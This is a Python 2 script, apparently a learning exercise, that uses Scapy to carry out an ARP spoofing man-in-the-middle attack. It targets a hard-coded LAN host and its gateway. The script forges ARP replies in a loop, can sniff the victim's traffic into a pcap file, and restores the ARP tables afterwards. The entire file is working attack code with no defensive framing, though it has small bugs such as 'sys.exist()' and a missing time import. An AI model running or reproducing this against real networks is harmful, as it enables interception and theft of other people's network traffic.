from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'wlp3s0'
TARGET_IP       =   '192.168.1.101'
GATEWAY_IP      =   '192.168.1.1'
PACKET_COUNT    =   1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring targets...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    print ip_address
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the ARP poison. [CTRL-C to stop]'
    while 1:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print '[*] ARP poison attack finished.'
        return


class ARP_Spoofing:
    def __init__(self, interface, gateway_ip, target_ip, packet_cnt):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.packet_cnt = packet_cnt
        self.init_mac()

    def init_mac(self):
        self.gateway_mac = get_mac(self.gateway_ip)
        self.target_mac = get_mac(self.target_ip)

    def spoof(self):
        conf.iface = self.interface
        conf.verb = 0
        print "[*] Setting up %s" % self.interface
        if self.gateway_mac is None:
            print "[-] Failed to get gateway MAC. Exiting."
            sys.exit(0)
        else:
            print "[*] Gateway %s is at %s" %(self.gateway_ip, self.gateway_mac)

        if self.target_mac is None:
            print "[-] Failed to get target MAC. Exiting."
            sys.exit(0)
        else:
            print "[*] Target %s is at %s" % (self.target_ip, self.target_mac)

        poison_thread = threading.Thread(target = poison_target, args=(self.gateway_ip, self.gateway_mac, \
            self.target_ip, self.target_mac))
        poison_thread.start()

    def restore(self):
        restore_target(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)

    def sniffer(self):
        try:
            print '[*] Starting sniffer for %d packets' % self.packet_cnt
            bpf_filter = 'IP host ' + self.target_ip
            packets = sniff(count=self.packet_cnt, iface=self.interface)
            wrpcap('results.pcap', packets)
            self.restore()

        except Scapy_Exception as msg:
            print msg, "Hi there!!"

        except KeyboardInterrupt:
            self.restore()
            sys.exist()

    '''
    try:
        print '[*] Starting sniffer for %d packets' %PACKET_COUNT
        bpf_filter = 'IP host ' + TARGET_IP
        packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
        wrpcap('results.pcap', packets)
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    except Scapy_Exception as msg:
        print msg, "Hi there!!"

    except KeyboardInterrupt:
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
        sys.exist()
    '''

if __name__ == '__main__':
    test = ARP_Spoofing(INTERFACE, GATEWAY_IP, TARGET_IP, PACKET_COUNT)
    test.spoof()
    '''
    conf.iface = INTERFACE
    conf.verb = 0
    print "[*] Setting up %s" % INTERFACE
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    if GATEWAY_MAC is None:
        print "[-] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" %(GATEWAY_IP, GATEWAY_MAC)

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print "[-] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (TARGET_IP, TARGET_MAC)

    poison_thread = threading.Thread(target = poison_target, args=(GATEWAY_IP, GATEWAY_MAC, \
        TARGET_IP, TARGET_MAC))
    poison_thread.start()

    try:
        print '[*] Starting sniffer for %d packets' %PACKET_COUNT
        bpf_filter = 'IP host ' + TARGET_IP
        packets = sniff(count=PACKET_COUNT, iface=INTERFACE)
        wrpcap('results.pcap', packets)
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)

    except Scapy_Exception as msg:
        print msg, "Hi there!!"

    except KeyboardInterrupt:
        restore_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
        sys.exist()
    '''